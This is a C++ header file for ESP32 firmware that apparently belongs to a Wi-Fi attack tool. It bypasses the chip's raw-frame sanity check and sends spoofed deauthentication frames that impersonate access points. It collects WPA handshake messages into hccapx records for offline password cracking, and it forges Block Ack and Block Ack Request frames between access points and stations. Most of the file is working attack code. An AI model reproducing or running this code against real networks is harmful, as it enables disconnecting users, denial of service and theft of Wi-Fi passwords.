#pragma once
#include <Arduino.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include <vector>
#include <map>
#include "setupppp.h"
#include "log.h"
#include "hccapx dude.h"

using namespace std;

uint8_t probe_packet[] = {
    0x40, 0x00, // Frame Control: Probe Request
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast)
    0x96, 0x96, 0x96, 0x96, 0x96, 0x96, // Source (Station's MAC Address, to be set dynamically)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID (Broadcast)
    0x00, 0x00, // Sequence number
    // Tagged Parameters (SSID and supported rates)
    0x00, 0x00,                         // SSID Parameter Set (SSID Length = 0 for broadcast)
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, // Supported Rates (1, 2, 5.5, 11 Mbps)
    0x12, 0x24, 0x48, 0x6c              // Extended Supported Rates (18, 36, 72, 108 Mbps)
};

struct HCCAPX_Entry {
    hccapx_t hccapx; // i hate unique_ptr now
    unsigned message_ap = 0;
    unsigned message_sta = 0;
};
struct STA_Info {
	std::array<uint8_t, 6> mac;
	int packetCount = 0, totalPacketCount = 0, packetsFromAP = 0, packetsToAP = 0, packetPerSecond = 0, rssitol = 0, rssi = 0;
	unsigned long lastPacketUpdate = 0;
};
struct AP_Info {
	String ssid;
	std::array<uint8_t, 6> bssid;
	std::vector<STA_Info> STAs;
	int rssitol = 0, rssi = 0, packetc = 0, m1 = 0, m2 = 0, m3 = 0, m4 = 0;
	unsigned long lastPacketUpdate = 0, lastFoundTime = 0;
	vector<HCCAPX_Entry> hccapx_list;
	bool hccapx_saved = false;
};
std::map<uint8_t, std::vector<AP_Info>> AP_Map;
std::vector<uint8_t> channels;
int beaconc, deauthc, probec, datac, packetc, eapolc, rssitol= 0;
static size_t channel_index = 0;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {return 0;}

void init_wifi(){
	nvs_flash_init();
	esp_netif_init();
	esp_event_loop_create_default();
	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
	ESP_ERROR_CHECK(esp_wifi_init(&cfg));
	
	esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
	esp_netif_ip_info_t ip_info;

	ip_info.ip.addr = ipaddr_addr("192.168.4.1");
	ip_info.gw.addr = ipaddr_addr("192.168.4.1");
	ip_info.netmask.addr = ipaddr_addr("255.255.255.0");

	ESP_ERROR_CHECK(esp_netif_dhcps_stop(ap_netif));
	ESP_ERROR_CHECK(esp_netif_set_ip_info(ap_netif, &ip_info));
	ESP_ERROR_CHECK(esp_netif_dhcps_start(ap_netif));

	ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
	ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
	ESP_ERROR_CHECK(esp_wifi_start());
	
	// enable all frames(VERY BAD!!!)
	#if ENABLE_ALL_FRAMES 
	wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
	wifi_promiscuous_filter_t ctrl_filter = {.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL};ESP_ERROR_CHECK(esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter));
	#endif
}

static const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

bool macValid(const uint8_t *mac) {
	static const uint8_t zeroMac[6] = {0};
	return memcmp(mac, zeroMac, 6) != 0 && memcmp(mac, broadcastMac, 6) != 0 && !(mac[0] & 0x01);
}
String formatMAC(const uint8_t* mac) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", MAC2STR(mac));
	return macStr;
}
void sendDeauth(const uint8_t *bssid) {
	uint8_t deauth_frame[26] = {0xc0,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,MAC2STR(bssid),MAC2STR(bssid),0x00,0x00,0x02,0x00};
	// Serial.printf("Sending deauth to BSSID: "MACSTR"\n", MAC2STR(bssid));
	ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false));
}
String BSSID2NAME(const uint8_t* mac, bool checkSTA = true) {
	for (auto& [channel, aps] : AP_Map) for (auto& ap : aps) {
		if (memcmp(ap.bssid.data(), mac, 6) == 0) return ap.ssid;
		if (checkSTA) for (auto& sta : ap.STAs) if (memcmp(mac, sta.mac.data(), 6) == 0) return formatMAC(mac) + " ST";
	}
	return formatMAC(mac);
}

void addAP(wifi_promiscuous_pkt_t* pkt, uint16_t pktlen){
#ifdef DONT_ADD_AP_NO_SCAN
	return;
#endif
	if (!no_scan_mode) return;
	array<uint8_t, 6> bssid;
	memcpy(bssid.data(), &pkt->payload[10], 6);

	uint8_t ssidLength = pkt->payload[37];
	String ssid;
	if (ssidLength > 0 && ssidLength <= 32) ssid = String((char*)&pkt->payload[38]).substring(0, ssidLength);
	else ssid = "<Hidden>";
	//TODO: add wpa3 detection
	uint8_t* taggedParams = &pkt->payload[37 + 1 + ssidLength];
	uint8_t apChannel = 0;

	while (taggedParams < pkt->payload + pktlen) {
		uint8_t tagNumber = taggedParams[0];
		uint8_t tagLength = taggedParams[1];
		if (tagNumber == 3 && tagLength == 1) {apChannel = taggedParams[2];break;}
		taggedParams += (2 + tagLength);
	}

	bool exists = false;
	for (auto& ap : AP_Map[apChannel]) if (memcmp(ap.bssid.data(), bssid.data(), 6) == 0) {exists = true;ap.lastFoundTime = millis();break;}

	if (!exists) {
		AP_Info newAP;
		newAP.ssid = ssid;
		newAP.bssid = bssid;
		newAP.rssi = pkt->rx_ctrl.rssi;
		newAP.lastPacketUpdate = millis();
		AP_Map[apChannel].push_back(newAP);
		log(0xB7E0, "+ " + ssid + "|Ch" + String(apChannel));
	}
}



// BA/BAR dev
void sendBAR(const uint8_t *ap_bssid, const uint8_t *sta_bssid) {
    uint8_t frame[] = {
        0x09, 0x00, // Frame Control: Type/Subtype
        0x00, 0x00, // Duration
        MAC2STR(ap_bssid), // Destination
        MAC2STR(sta_bssid),       // Source
        MAC2STR(ap_bssid),       // BSSID
        0x00, 0x00, // Sequence/Fragment number

        // Payload
		0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0x7f, 0x92, 0x08, 0x80
    };

    Serial.printf("Sending BAR from STA " MACSTR " to AP " MACSTR "\n", MAC2STR(sta_bssid), MAC2STR(ap_bssid));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false));
}

void sendBA(const uint8_t *ap_bssid, const uint8_t *sta_bssid) {
    uint8_t frame[] = {
        0x09, 0x00, // Frame Control: Type/Subtype
        0x00, 0x00, // Duration
        sta_bssid[0], sta_bssid[1], sta_bssid[2], sta_bssid[3], sta_bssid[4], sta_bssid[5], // Destination (STA)
        ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5],       // Source (AP)
        ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5],       // BSSID (AP)
        0x00, 0x00, // Sequence/Fragment number

        // BA Control Field
        0x00, 0x01, // TID = 0, ACK Policy = 0 (Normal)
        
        // Block Ack Starting Sequence Control
        0x00, 0x00, // Fragment Number = 0, Sequence Number = 0
        
        // Bitmap (128 bits, 16 bytes) - Acknowledging all packets in this example
        0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
    };

    Serial.printf("Sending BA from AP (BSSID: %s) to STA (MAC: %s)\n", 
                  BSSID2NAME(ap_bssid).c_str(), BSSID2NAME(sta_bssid).c_str());
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false));
}
